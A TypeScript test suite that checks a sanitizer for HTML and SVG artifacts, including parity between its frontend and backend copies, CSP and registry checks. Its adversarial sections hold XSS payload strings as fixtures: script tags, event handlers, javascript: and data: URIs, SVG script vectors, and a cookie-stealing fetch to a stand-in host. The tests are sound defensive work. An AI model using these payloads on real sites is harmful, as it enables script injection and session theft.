// Guardrail tests for the rich-artifact node types ('html-artifact', 'svg-artifact').
//
// Covers:
//   1. frontend/backend sanitizer copies are logically identical (same parity
//      guard used by test_timing.ts for the scene-timing copies)
//   2. normal HTML / SVG artifacts survive sanitizing intact
//   3. adversarial payloads — script injection, event handlers, javascript:/data:
//      URIs, malformed SVG with embedded script, external resource loads,
//      oversized payloads — are ALL neutralized
//   4. the srcdoc carries the artifact-scoped CSP and never re-admits script
//   5. registry + validator integration (artifact nodes are ordinary members,
//      and unsafe ones raise unsafe_artifact_content violations)
//
// Run: npm run test:artifacts   (from repo root)

import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import {
  sanitizeArtifact, buildArtifactSrcDoc, ARTIFACT_CSP,
  MAX_ARTIFACT_BYTES, MIN_RETENTION_RATIO,
  isArtifactRenderType, artifactKindOf,
} from '../backend/src/services/artifactSanitizer';
import { validateTree, assessArtifactNode } from '../backend/src/services/uiValidator';
import { REGISTRY_BY_TYPE } from '../backend/src/registry/componentRegistry';
import { deriveConstraints } from '../backend/src/services/componentSelector';
import { ShapeSignature } from '../backend/src/types';

const ROOT = join(__dirname, '..');

let passed = 0;
function t(name: string, fn: () => void) {
  try { fn(); passed++; console.log(`  ok  ${name}`); }
  catch (e: any) { console.error(`  FAIL ${name}\n       ${e.message}`); process.exitCode = 1; }
}

// Reduce a copy to just its executable logic (same reduction as test_timing.ts).
const logic = (src: string) =>
  src.replace(/\/\/.*$/gm, '').split('\n').map((l) => l.trim()).filter(Boolean).join('\n');

// Assert a sanitized payload contains no executable vector, whatever the input.
function assertInert(safe: string, label: string) {
  const s = safe.toLowerCase();
  assert.ok(!/<\s*script/.test(s), `${label}: <script> survived`);
  assert.ok(!/\son[a-z]+\s*=/.test(s), `${label}: inline event handler survived`);
  assert.ok(!s.includes('javascript:'), `${label}: javascript: URI survived`);
  assert.ok(!s.includes('data:'), `${label}: data: URI survived`);
  assert.ok(!s.includes('vbscript:'), `${label}: vbscript: URI survived`);
  assert.ok(!/<\s*iframe|<\s*object|<\s*embed/.test(s), `${label}: nested browsing context survived`);
  assert.ok(!/<\s*foreignobject/.test(s), `${label}: foreignObject survived`);
  assert.ok(!/\sstyle\s*=/.test(s), `${label}: style attribute survived`);
  assert.ok(!/<\s*style/.test(s), `${label}: <style> survived`);
  assert.ok(!/xlink:href/.test(s), `${label}: xlink:href survived`);
  // Strongest property: every '<' and '>' left in the output must belong to an
  // element the tokenizer itself emitted. Remove well-formed tags and no raw
  // angle bracket may remain — i.e. no fragment of the payload can re-form into
  // markup. This is what makes leftover payload *text* harmless.
  const residue = safe.replace(/<\/?[a-zA-Z][a-zA-Z0-9:-]*(?:\s[^<>]*)?\/?>/g, '');
  assert.ok(!residue.includes('<'), `${label}: unescaped '<' survived in text`);
  assert.ok(!residue.includes('>'), `${label}: unescaped '>' survived in text`);
}

console.log('sanitizer copy parity');
t('frontend and backend copies are logically identical', () => {
  const back = logic(readFileSync(join(ROOT, 'backend/src/services/artifactSanitizer.ts'), 'utf8'));
  const front = logic(readFileSync(join(ROOT, 'src/app/components/artifactSanitizer.ts'), 'utf8'));
  assert.equal(
    front, back,
    'backend/src/services/artifactSanitizer.ts and src/app/components/artifactSanitizer.ts have diverged.\n' +
    'Edit BOTH copies identically.',
  );
});

console.log('helpers');
t('isArtifactRenderType / artifactKindOf', () => {
  assert.equal(isArtifactRenderType('html-artifact'), true);
  assert.equal(isArtifactRenderType('svg-artifact'), true);
  assert.equal(isArtifactRenderType('BarChart'), false);
  assert.equal(isArtifactRenderType(undefined), false);
  assert.equal(artifactKindOf('svg-artifact'), 'svg');
  assert.equal(artifactKindOf('html-artifact'), 'html');
});

console.log('happy path — normal artifacts render');
t('plain HTML artifact survives intact and is usable', () => {
  const html = '<div class="wrap"><h3>Q1 Summary</h3><p>Revenue grew <strong>18%</strong> YoY.</p>' +
    '<table><thead><tr><th>Region</th><th>Rev</th></tr></thead>' +
    '<tbody><tr><td>EMEA</td><td>1.2M</td></tr></tbody></table></div>';
  const r = sanitizeArtifact(html, 'html');
  assert.equal(r.usable, true, 'expected usable');
  assert.ok(r.safe.includes('<strong>18%</strong>'));
  assert.ok(r.safe.includes('<table>'));
  assert.ok(r.safe.includes('Q1 Summary'));
  assertInert(r.safe, 'plain html');
});

t('plain SVG artifact survives intact and is usable', () => {
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 50">' +
    '<rect x="0" y="0" width="40" height="20" fill="#2563EB"/>' +
    '<path d="M0 0 L100 50" stroke="#7C3AED" stroke-width="2"/>' +
    '<text x="10" y="40" font-size="8">Flow</text></svg>';
  const r = sanitizeArtifact(svg, 'svg');
  assert.equal(r.usable, true, 'expected usable');
  assert.ok(r.safe.includes('<svg'));
  assert.ok(r.safe.includes('<rect'));
  assert.ok(r.safe.includes('fill="#2563EB"'));
  assert.ok(r.safe.includes('Flow'));
  assertInert(r.safe, 'plain svg');
});

t('relative and fragment hrefs are preserved', () => {
  const r = sanitizeArtifact('<p><a href="#section-2">Jump</a> <a href="/reports/q1">Report</a></p>', 'html');
  assert.ok(r.safe.includes('href="#section-2"'));
  assert.ok(r.safe.includes('href="/reports/q1"'));
});

console.log('character references');
t('existing entities are preserved, not double-escaped', () => {
  // Regression: escaping '&' unconditionally turned '&nbsp;' into '&amp;nbsp;', which
  // rendered as the literal text "&nbsp;" in the artifact frame (seen in a real report).
  const r = sanitizeArtifact(
    '<p>April 2024 &nbsp;|&nbsp; take rate (&lt;56%) and AARD (&gt;29%) &amp; rising</p>', 'html');
  assert.ok(r.safe.includes('&nbsp;'), 'nbsp was mangled');
  assert.ok(!r.safe.includes('&amp;nbsp;'), 'nbsp was double-escaped');
  assert.ok(r.safe.includes('&lt;56%'), 'lt entity was mangled');
  assert.ok(!r.safe.includes('&amp;lt;'), 'lt entity was double-escaped');
  assert.ok(r.safe.includes('&gt;29%'), 'gt entity was mangled');
  assert.ok(r.safe.includes('&amp; rising'), 'literal ampersand should still be escaped');
});

t('bare ampersands are still escaped', () => {
  const r = sanitizeArtifact('<p>Sales & Marketing, R&D, AT&T</p>', 'html');
  assert.ok(r.safe.includes('Sales &amp; Marketing'), 'bare & not escaped');
  assert.ok(r.safe.includes('R&amp;D'), 'bare & not escaped');
  assert.ok(r.safe.includes('AT&amp;T'), 'bare & not escaped');
});

t('entity-encoded markup cannot smuggle a tag through', () => {
  // Preserving references must not let '&lt;script&gt;' become an executable tag —
  // a decoded entity is text and is never re-parsed as markup.
  const r = sanitizeArtifact('<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>', 'html');
  assertInert(r.safe, 'entity-encoded script');
  assert.ok(!/<\s*script/i.test(r.safe), 'entity decoded into a real tag');
});

t('entity-encoded javascript: URI is still rejected', () => {
  const r = sanitizeArtifact('<a href="&#106;avascript:alert(1)">x</a>', 'html');
  assert.ok(!r.safe.includes('href='), 'entity-encoded scheme survived');
  assertInert(r.safe, 'entity-encoded scheme');
});

console.log('adversarial — script injection');
t('script tag and its body are removed entirely', () => {
  const r = sanitizeArtifact(
    '<div><p>Safe copy here that is long enough to matter for retention.</p>' +
    '<script>fetch("https:" + "//evil.test/steal?c=" + document.cookie)</script></div>', 'html');
  assertInert(r.safe, 'script injection');
  assert.ok(!r.safe.includes('document.cookie'), 'script body leaked as text');
  assert.ok(!r.safe.includes('evil.test'), 'script body leaked as text');
  assert.ok(r.safe.includes('Safe copy here'), 'legitimate content should survive');
  assert.ok(r.removed.includes('tag:script'));
});

t('nested / obfuscated script tags do not reassemble', () => {
  // NOTE on the assertion used here. A fragmented payload like
  // '<scr<script>ipt>alert(1)</script>' sanitizes to '<p>text</p>ipt&gt;alert(1)':
  // the literal text "alert(1)" remains, but every angle bracket around it is
  // escaped, so it is inert prose — it cannot re-form into a tag and cannot
  // execute. (DOMPurify behaves the same way: markup is neutralized, text is
  // kept.) So we assert INERTNESS via assertInert, which proves no unescaped
  // markup survived — not mere absence of the substring, which would be testing
  // the wrong property. The `<scr` + `ipt>` recombination bypass is defeated
  // because the tokenizer escapes leftovers instead of re-emitting them.
  for (const payload of [
    '<scr<script>ipt>alert(1)</script>',
    '<SCRIPT SRC="https:x">alert(1)</SCRIPT>',
    '<script\n>alert(1)</script\n>',
    '<script/xss>alert(1)</script>',
    '<<script>script>alert(1)</script>',
  ]) {
    const r = sanitizeArtifact('<p>text</p>' + payload, 'html');
    assertInert(r.safe, `obfuscated: ${payload}`);
    // And it must never re-emit an executable script element.
    assert.ok(!/<\s*script/i.test(r.safe), `script element re-formed for: ${payload}`);
  }
});

console.log('adversarial — event handlers');
t('inline event handlers are stripped from every element', () => {
  for (const payload of [
    '<div onclick="alert(1)">x</div>',
    '<p ONMOUSEOVER="alert(1)">x</p>',
    '<img src="/a.png" onerror=alert(1)>',
    "<div onload='alert(1)'>x</div>",
    '<div\tonclick="alert(1)">x</div>',
  ]) {
    const r = sanitizeArtifact(payload, 'html');
    assertInert(r.safe, `handler: ${payload}`);
    assert.ok(!r.safe.includes('alert(1)'), `handler body leaked for: ${payload}`);
  }
});

t('SVG event handlers are stripped', () => {
  const r = sanitizeArtifact(
    '<svg viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" onload="alert(1)" onclick="alert(2)"/></svg>', 'svg');
  assertInert(r.safe, 'svg handlers');
  assert.ok(r.safe.includes('<circle'), 'element itself should survive');
  assert.ok(!r.safe.includes('alert'));
});

console.log('adversarial — dangerous URIs');
t('javascript: and data: URIs are dropped, element kept', () => {
  for (const payload of [
    '<a href="javascript:alert(1)">click</a>',
    '<a href="JaVaScRiPt:alert(1)">click</a>',
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
    '<a href="vbscript:msgbox(1)">click</a>',
    '<a href="  javascript:alert(1)">click</a>',
  ]) {
    const r = sanitizeArtifact(payload, 'html');
    assertInert(r.safe, `uri: ${payload}`);
    assert.ok(!r.safe.includes('href='), `dangerous href survived for: ${payload}`);
    assert.ok(r.safe.includes('click'), 'link text should survive');
  }
});

t('scheme split by control characters is still blocked', () => {
  const r = sanitizeArtifact('<a href="java\tscript:alert(1)">x</a>', 'html');
  assert.ok(!r.safe.includes('href='), 'tab-split javascript: survived');
  assertInert(r.safe, 'control-char split');
});

console.log('adversarial — external resource loads');
t('external resource elements and origins are blocked by default', () => {
  const r = sanitizeArtifact(
    '<p>Report body long enough to keep retention sane.</p>' +
    '<link rel="stylesheet" href="https:REDACTED">' +
    '<img src="https:REDACTED/track.gif">' +
    '<iframe src="https:REDACTED"></iframe>' +
    '<object data="https:REDACTED"></object>', 'html');
  assertInert(r.safe, 'external loads');
  assert.ok(!r.safe.includes('REDACTED'), 'external origin survived');
  assert.ok(r.removed.some(x => x.startsWith('tag:')), 'expected tag removals');
});

t('explicitly whitelisted origins are permitted', () => {
  const r = sanitizeArtifact('<p><a href="https:REDACTED/doc">d</a></p>', 'html', {
    allowedOrigins: ['https:REDACTED'],
  });
  assert.ok(r.safe.includes('href='), 'whitelisted origin should be kept');
});

console.log('adversarial — malformed SVG with embedded script');
t('SVG with embedded script / foreignObject is neutralized', () => {
  const payload =
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">' +
    '<script type="text/javascript">alert(document.domain)</script>' +
    '<foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml">' +
    '<script>alert(2)</script></body></foreignObject>' +
    '<circle cx="50" cy="50" r="40" fill="#0D9488"/></svg>';
  const r = sanitizeArtifact(payload, 'svg');
  assertInert(r.safe, 'svg embedded script');
  assert.ok(!r.safe.includes('alert'), 'script body leaked');
  assert.ok(!r.safe.includes('document.domain'));
  assert.ok(r.safe.includes('<circle'), 'legitimate vector content should survive');
});

t('SVG SMIL animation and xlink vectors are removed', () => {
  const r = sanitizeArtifact(
    '<svg viewBox="0 0 10 10"><rect width="10" height="10"/>' +
    '<animate attributeName="href" to="javascript:alert(1)"/>' +
    '<set attributeName="onload" to="alert(1)"/>' +
    '<use xlink:href="https:REDACTED#x"/></svg>', 'svg');
  assertInert(r.safe, 'smil/xlink');
  assert.ok(!r.safe.includes('alert'));
  assert.ok(!r.safe.includes('REDACTED'));
});

t('malformed / unterminated markup never throws and stays inert', () => {
  for (const payload of [
    '<svg><circle cx="5"',
    '<div><p>unclosed',
    '<<<>>><script',
    '<!-- <script>alert(1)</script> -->',
    '<![CDATA[<script>alert(1)</script>]]>',
    '<?xml-stylesheet href="javascript:alert(1)"?>',
  ]) {
    let r: ReturnType<typeof sanitizeArtifact> | undefined;
    assert.doesNotThrow(() => { r = sanitizeArtifact(payload, 'svg'); }, `threw on: ${payload}`);
    assertInert(r!.safe, `malformed: ${payload}`);
    assert.ok(!r!.safe.includes('alert(1)'), `alert leaked for: ${payload}`);
  }
});

t('non-string / empty content is handled without throwing', () => {
  for (const bad of [null, undefined, 42, {}, [], '']) {
    let r: ReturnType<typeof sanitizeArtifact> | undefined;
    assert.doesNotThrow(() => { r = sanitizeArtifact(bad as any, 'html'); });
    assert.equal(r!.usable, false);
    assert.equal(r!.safe, '');
  }
});

console.log('adversarial — oversized payloads');
t('payload over the byte cap is refused outright', () => {
  const huge = '<p>' + 'A'.repeat(MAX_ARTIFACT_BYTES + 1) + '</p>';
  const r = sanitizeArtifact(huge, 'html');
  assert.equal(r.oversized, true);
  assert.equal(r.usable, false);
  assert.equal(r.safe, '', 'oversized payload must not be sanitized or emitted');
  assert.deepEqual(r.removed, ['oversized']);
});

t('payload just under the cap is still processed', () => {
  const body = 'B'.repeat(MAX_ARTIFACT_BYTES - 100);
  const r = sanitizeArtifact('<p>' + body + '</p>', 'html');
  assert.equal(r.oversized, false);
  assert.equal(r.usable, true);
});

console.log('fallback / downgrade threshold');
t('mostly-malicious payload downgrades instead of rendering', () => {
  const r = sanitizeArtifact(
    '<div><script>' + 'x'.repeat(4000) + '</script><p>hi</p></div>', 'html');
  assert.ok(r.retention < MIN_RETENTION_RATIO, `retention ${r.retention} should be below threshold`);
  assert.equal(r.usable, false, 'should be marked unusable => downgrade');
});

t('payload with no renderable content is unusable', () => {
  const r = sanitizeArtifact('<script>alert(1)</script>', 'html');
  assert.equal(r.usable, false);
  assert.equal(r.safe, '');
});

console.log('srcdoc + CSP');
t('CSP blocks script and external origins', () => {
  assert.ok(ARTIFACT_CSP.includes("script-src 'none'"));
  assert.ok(ARTIFACT_CSP.includes("default-src 'none'"));
  assert.ok(ARTIFACT_CSP.includes("object-src 'none'"));
  assert.ok(ARTIFACT_CSP.includes("base-uri 'none'"));
  assert.ok(ARTIFACT_CSP.includes("form-action 'none'"));
  assert.ok(!ARTIFACT_CSP.includes("script-src 'unsafe-inline'"));
});

t('srcdoc embeds the CSP and stays inert for adversarial input', () => {
  const r = sanitizeArtifact('<div onclick="alert(1)"><script>alert(2)</script><p>ok</p></div>', 'html');
  const doc = buildArtifactSrcDoc(r.safe, 'html');
  assert.ok(doc.includes('http-equiv="Content-Security-Policy"'));
  assert.ok(doc.includes(ARTIFACT_CSP));
  assert.ok(!/<\s*script/i.test(doc), 'srcdoc contains a script tag');
  assert.ok(!doc.includes('alert('), 'srcdoc leaked script body');
});

console.log('registry + validator integration');
t('both artifact types are ordinary registry members', () => {
  for (const type of ['html-artifact', 'svg-artifact']) {
    const spec = REGISTRY_BY_TYPE[type];
    assert.ok(spec, `${type} missing from registry`);
    assert.deepEqual(spec.requiredProps, ['content']);
    assert.equal(spec.dataNeeds, 'none');
    assert.equal(spec.tier, 'organism');
    assert.ok(spec.outputModes.length > 0, `${type} must be selectable in some output mode`);
  }
});

t('artifact types are LLM-selectable via deriveConstraints', () => {
  const shape: ShapeSignature = {
    rowCount: 12, columnCount: 3, isTimeSeries: false,
    dimensionColumns: ['region'], measureColumns: ['revenue'],
  } as ShapeSignature;
  const c = deriveConstraints('narrative', shape);
  assert.ok(c.allowedComponents.includes('html-artifact'), 'html-artifact not selectable in narrative mode');
  assert.ok(c.allowedComponents.includes('svg-artifact'), 'svg-artifact not selectable in narrative mode');
});

t('clean artifact node produces no violations', () => {
  const { violations } = validateTree([
    { renderType: 'html-artifact', props: { content: '<p>Revenue grew steadily across all four regions this quarter.</p>', title: 'Summary' } },
  ]);
  assert.deepEqual(violations, [], JSON.stringify(violations));
});

t('unsafe artifact node raises unsafe_artifact_content', () => {
  const { violations } = validateTree([
    { renderType: 'html-artifact', props: { content: '<div onclick="alert(1)"><script>alert(2)</script></div>' } },
  ]);
  const cats = violations.map(v => v.category);
  assert.ok(cats.includes('unsafe_artifact_content'), JSON.stringify(violations));
});

t('missing content raises a violation', () => {
  const { violations } = validateTree([{ renderType: 'svg-artifact', props: {} }]);
  assert.ok(violations.some(v => v.category === 'missing_prop' && v.detail === 'content'), JSON.stringify(violations));
  assert.ok(violations.some(v => v.category === 'unsafe_artifact_content'), JSON.stringify(violations));
});

t('assessArtifactNode returns null for non-artifact nodes', () => {
  assert.equal(assessArtifactNode({ renderType: 'BarChart', props: { xKey: 'a', yKey: 'b' } }), null);
  const a = assessArtifactNode({ renderType: 'svg-artifact', props: { content: '<svg><rect width="4" height="4"/></svg>' } });
  assert.ok(a);
  assert.equal(a!.kind, 'svg');
  assert.equal(a!.shouldDowngrade, false);
});

t('artifact validation does not disturb non-artifact nodes', () => {
  const { violations } = validateTree([
    { renderType: 'BarChart', props: { xKey: 'a', yKey: 'b', data: [] } },
    { renderType: 'KPICard', props: { title: 'T', value: 1 } },
  ]);
  assert.deepEqual(violations, [], JSON.stringify(violations));
});

console.log(`\n${passed} passed.`);
